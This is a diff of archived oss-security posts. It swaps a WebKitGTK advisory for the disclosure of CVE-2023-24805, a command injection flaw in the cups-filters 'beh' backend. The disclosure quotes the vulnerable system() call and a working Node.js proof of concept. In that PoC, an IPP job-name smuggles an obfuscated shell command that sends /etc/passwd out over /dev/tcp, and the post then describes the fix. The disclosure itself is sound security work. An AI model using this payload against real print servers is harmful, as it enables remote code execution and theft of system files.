@@ -1,48 +1,101 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/07/21/6
-Message-ID: <635dea71-43eb-d11b-f030-a2c5a39f109d@igalia.com>
-Date: Fri, 21 Jul 2023 17:42:24 +0200
-From: Carlos Alberto Lopez Perez <clopez@...lia.com>
-To: webkit-gtk@...ts.webkit.org, webkit-wpe@...ts.webkit.org
-Cc: security@...kit.org, oss-security@...ts.openwall.com
-Subject: WebKitGTK and WPE WebKit Security Advisory WSA-2023-0006
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/05/17/5
+Message-ID: <d20c573e-81ca-800d-5bf8-c2f96b31ea82@gmail.com>
+Date: Wed, 17 May 2023 11:30:11 +0200
+From: Till Kamppeter <till.kamppeter@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2023-24805: RCE in cups-filters, beh CUPS backend
 Content-Type: text/plain; charset=utf-8
 
-------------------------------------------------------------------------
-WebKitGTK and WPE WebKit Security Advisory                 WSA-2023-0006
-------------------------------------------------------------------------
+Following bug got reported to OpenPrinting's GitHub, repo cups-filters, 
+as a private (security) issue report:
 
-Date reported           : July 21, 2023
-Advisory ID             : WSA-2023-0006
-WebKitGTK Advisory URL  : https://webkitgtk.org/security/WSA-2023-0006.html
-WPE WebKit Advisory URL : https://wpewebkit.org/security/WSA-2023-0006.html
-CVE identifiers         : CVE-2023-37450, CVE-2023-32393.
+https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x
 
-Several vulnerabilities were discovered in WebKitGTK and WPE WebKit.
+Summary
 
-CVE-2023-37450
-    Versions affected: WebKitGTK and WPE WebKit before 2.40.4.
-    Credit to an anonymous researcher.
-    Impact: Processing web content may lead to arbitrary code execution.
-    Apple is aware of a report that this issue may have been actively
-    exploited. Description: The issue was addressed with improved
-    checks.
+If you use "beh" to create an accessible network printer, this security 
+vulnerability can cause remote code execution.
 
-CVE-2023-32393
-    Versions affected: WebKitGTK and WPE WebKit before 2.40.0.
-    Credit to Francisco Alonso (@revskills).
-    Impact: Processing web content may lead to arbitrary code execution.
-    Description: The issue was addressed with improved memory handling.
+Details
+
+cups-filters/backend/beh.c
+
+Line 288 in 5c9498a
+   retval = system(cmdline) >> 8;
+
+     // (context: argv = beh <job-id> <user> <title> <copies> <options> 
+[file])
+      snprintf(cmdline, sizeof(cmdline),
+      "%s/backend/%s '%s' '%s' '%s' '%s' '%s' %s",
+      cups_serverbin, scheme, argv[1], argv[2], argv[3],
+            ...
+      (argc == 6 ? "1" : argv[4]),
+      argv[5], filename);
+            ...
+    retval = system(cmdline) >> 8;
+
+The system function will be called here to execute the command, and the 
+user and title parameters are user-controlled and unsanitized .
+
+PoC
+
+      start a beh service lpadmin -p myprinter -E -v 
+beh:/1/3/5/socket://printer:9100
+
+      exploit: // https://github.com/williamkapke/ipp
+
+var ipp = require('ipp');
+var PDFDocument = require('pdfkit');
+var concat = require("concat-stream");
+
+var doc = new PDFDocument({margin:0});
+doc.text("1.pdf", 0, 0);
 
 
-We recommend updating to the latest stable versions of WebKitGTK and WPE
-WebKit. It is the best way to ensure that you are running safe versions
-of WebKit. Please check our websites for information about the latest
-stable releases.
+doc.pipe(concat(function (data) {
+var printer = ipp.Printer("http://127.0.0.1:6310/printers/myprinter");
+var msg = {
+"operation-attributes-tag": {
+"requesting-user-name": "Bumblebee",
+"job-name": "';env; bash -c \"/usr/bin/cat ${PWD}etc/${PWD}/passwd > 
+${PWD}dev${PWD}tcp${PWD}127.0.0.1${PWD}1337\";'' #.pdf",
+"document-format": "application/pdf"
+},
+"job-attributes-tag":{
+        "media-col": {
+          "media-source": "tray-2"
+        }
+}
+, data: data
+};
+printer.execute("Print-Job", msg, function(err, res){
+console.log(err);
+console.log(res);
+});
+}));
+doc.end();
 
-Further information about WebKitGTK and WPE WebKit security advisories
-can be found at: https://webkitgtk.org/security.html or
-https://wpewebkit.org/security/.
 
-The WebKitGTK and WPE WebKit team,
-July 21, 2023
+The report got assigned CVE-2023-24805
+
+A fix is to use execv() instead of system() and was proposed as a pull 
+request attached to the bug report.
+
+https://github.com/OpenPrinting/cups-filters-ghsa-gpxc-v2m8-fr3x/pull/1
+
+The pull request is merged now into
+
+https://github.com/OpenPrinting/cups-filters (branch "master")
+
+as commit
+
+https://github.com/OpenPrinting/cups-filters/commit/8f274035756
+
+and the fix is also ported to the "1.x" branch of cups-filters, as commit
+
+https://github.com/OpenPrinting/cups-filters/commit/93e60d3df35
+
+The fix will also be included in the upcoming releases, 2.0.0 and 1.28.18.
+
+    Till
